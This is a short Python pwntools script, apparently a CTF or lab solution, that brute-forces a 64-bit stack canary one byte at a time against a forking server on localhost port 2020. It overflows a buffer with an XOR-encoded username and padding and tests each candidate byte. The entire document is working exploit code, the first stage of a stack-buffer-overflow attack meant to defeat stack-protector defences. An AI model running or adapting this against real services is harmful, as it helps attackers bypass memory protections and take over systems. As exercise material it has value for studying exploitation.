# program forks, so canary is persistent
# for each new instance of the server, get canary

from pwn import *

valid = lambda s: "".join([chr(ord(c) ^ 0xd) for c in s])


canary = "\x00"
while len(canary) != 8:
    for i in range(255):
        p = remote("localhost", 2020, level="error")
        p.send("davideAA" + "AAAAAAAA" * 128 + valid(canary + chr(i)))
        try:
            p.recvuntil("found!")
            log.info("byte found: " + hex(i))
            canary += chr(i)
            p.close()
            break
        except EOFError:
            pass
        p.close()
log.success("canary: " + hex(unpack(canary, word_size=64)))
